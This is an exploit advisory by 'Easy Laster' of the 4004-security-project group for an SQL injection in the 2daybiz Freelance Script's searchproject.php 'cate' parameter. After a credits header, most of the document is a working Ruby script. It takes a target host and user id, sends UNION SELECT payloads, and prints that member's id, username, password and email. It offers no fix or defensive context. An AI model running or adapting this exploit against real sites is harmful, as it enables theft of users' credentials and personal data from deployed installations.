----------------------------Information------------------------------------------------
+Autor : Easy Laster
+ICQ : 11-051-551
+Info : http://www.2daybiz.com/freelance_script.html
+Discovered by Easy Laster 4004-security-project.com
+Security Group Undergroundagents and 4004-Security-Project 4004-security-project.com
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox.
   
---------------------------------------------------------------------------------------
                                                                                       
___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|         
   
   
----------------------------------------------------------------------------------------
+Vulnerability : www.site.com/script/searchproject.php?cate=
----------------------------------------------------------------------------------------
+exploit in ruby

#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
#             2daybiz Freelance Script SQL Injection    #
#                    Vulnerability Exploit              #
#                    Using Host+Path+userid             #
#                      demo.com /script/ 1              #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/script/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter userid (userid)->"
userid=gets.chomp
print ""+ block +""
begin
dir = "searchproject.php?cate=%27+/**/UnIoN+/**/SeLeCt+/**/1,2,3,4,5,6,7,8,9,10,11,12,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,member_id,0x23,0x23,0x23,0x23,0x23),14,15,16,17,18,19,20,21,22,23,24+fRoM+members+WhErE+member_id="+ userid +"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe ID is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "searchproject.php?cate=%27+/**/UnIoN+/**/SeLeCt+/**/1,2,3,4,5,6,7,8,9,10,11,12,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,name,0x23,0x23,0x23,0x23,0x23),14,15,16,17,18,19,20,21,22,23,24+fRoM+members+WhErE+member_id="+ userid +"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe username is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "searchproject.php?cate=%27+/**/UnIoN+/**/SeLeCt+/**/1,2,3,4,5,6,7,8,9,10,11,12,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,password,0x23,0x23,0x23,0x23,0x23),14,15,16,17,18,19,20,21,22,23,24+fRoM+members+WhErE+member_id="+ userid +"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "searchproject.php?cate=%27+/**/UnIoN+/**/SeLeCt+/**/1,2,3,4,5,6,7,8,9,10,11,12,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23),14,15,16,17,18,19,20,21,22,23,24+fRoM+members+WhErE+member_id="+ userid +"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Email is  -> "+(/#####(.+)#####/).match(resp.body)[1]
rescue
print "\nExploit failed"
end

